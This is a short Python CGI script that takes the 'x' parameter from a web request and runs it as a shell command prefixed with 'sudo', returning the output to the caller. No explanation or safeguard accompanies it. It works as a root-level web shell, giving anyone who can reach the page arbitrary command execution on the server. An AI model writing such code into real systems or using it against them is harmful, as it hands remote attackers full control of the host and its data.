#!/usr/bin/python3

import cgi, subprocess

print("content-type: text/html")
print()

func = cgi.FieldStorage()
cmd =func.getvalue("x")

o = subprocess.getoutput("sudo " + cmd)
print(o)
